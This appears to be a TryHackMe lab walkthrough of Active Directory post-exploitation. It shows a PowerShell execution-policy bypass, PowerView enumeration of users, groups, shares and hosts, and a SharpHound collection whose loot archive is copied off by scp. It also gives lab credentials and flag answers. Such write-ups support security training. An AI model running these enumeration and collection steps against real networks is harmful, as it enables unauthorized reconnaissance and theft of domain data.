# Post Exploitable

----------------------------

> https://tryhackme.com/room/postexploit

> IP : 10.10.189.246

--------------------------

**Given Credentials**
```
ssh/Rdp connect

User:Administrator
Pass:P@$$W0rd
Domain:Controller
```

`powershell -ep bypass` 

>ep bypasses the execution policy of powershell allowing you to easily run scripts

```
Controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> 
```

---------------------------------------------------

**Enumeration w/ Powerview**

> starting powerview tool in powershell

```
PS C:\Users\Administrator\Downloads> ls


    Directory: C:\Users\Administrator\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/14/2020  11:39 AM        1261832 mimikatz.exe
-a----        5/14/2020  11:41 AM         374625 PowerView.ps1
-a----        5/14/2020  11:43 AM         973325 SharpHound.ps1


PS C:\Users\Administrator\Downloads> .\PowerView.ps1
```

_Enumerate the domain users_ - `Get-NetUser | select cn`

```
PS C:\Users\Administrator> Get-NetUser | select cn

cn
--
Administrator
Guest
krbtgt
Machine-1
Admin2
Machine-2
SQL Service
POST{P0W3RV13W_FTW}
sshd
```



_Enumerate the domain groups_ - `Get-NetGroup -GroupName *admin*`
```
PS C:\Users\Administrator> Get-NetGroup -GroupName *admin*
Administrators 
Hyper-V Administrators
Storage Replica Administrators
Schema Admins
Enterprise Admins
Domain Admins
Key Admins
Enterprise Key Admins
DnsAdmins
```
> Here's a cheatsheet to help you with commands: 
> https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

**Answering Question from this section**

```
1.What is the shared folder that is not set by default? 

=> share

```
Explaination

> just see the hint : Invoke-ShareFinder

```
PS C:\Users\Administrator> Invoke-ShareFinder
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin 
\\Domain-Controller.CONTROLLER.local\C$         - Default share
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share
```
-------------------------------

```
2.What operating system is running inside of the network besides Windows Server 2019?

=> Windows 10 Enterprise Evaluation

```
```
PS C:\Users\Administrator> Get-NetComputer -fulldata | select operatingsystem   

operatingsystem
---------------
Windows Server 2019 Standard
Windows 10 Enterprise Evaluation
Windows 10 Enterprise Evaluation
```
---------------------------------------
```
3.I've hidden a flag inside of the users find it

=> POST{P0W3RV13W_FTW}
```
Explaination 

> Refer to Enumuration part above 

----------------------------------------
_________________________________________

**Enumeration w/ Bloodhound**

BloodHound Installation -
```
1.) apt-get install bloodhound    

2.) neo4j console - default credentials -> neo4j:neo4j
```
Getting loot w/ SharpHound -
```
1.) powershell -ep bypass same as with PowerView

2.) . .\Downloads\SharpHound.ps1    

3.) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip 
```
```
PS C:\Users\Administrator>  . .\Downloads\SharpHound.ps1
PS C:\Users\Administrator> Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
----------------------------------------------
Initializing SharpHound at 2:48 AM on 2/6/2022
----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain CONTROLLER.LOCAL using path CN=Schema,CN=Configuration,DC=CONTROLLER,DC=LOCAL
PS C:\Users\Administrator> [+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 104 MB RAM
Status: 66 objects finished (+66 66)/s -- Using 107 MB RAM
Enumeration finished in 00:00:01.2154975
Compressing data to C:\Users\Administrator\20220206024805_loot.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 2:48 AM on 2/6/2022! Happy Graphing!
```
Transfer the loot.zip file to your local machine 

> note: you can use scp to transfer the file if you’re using ssh

		scp Administrator@controller:C:/Users/Administrator/20220206024805_loot.zip .

```
┌──(kali㉿kali)-[~/thm/machine/post-exploitation]
└─$ scp Administrator@controller:C:/Users/Administrator/20220206024805_loot.zip .
Administrator@controller's password: 
20220206024805_loot.zi 100% 9574    55.9KB/s   00:00 
```
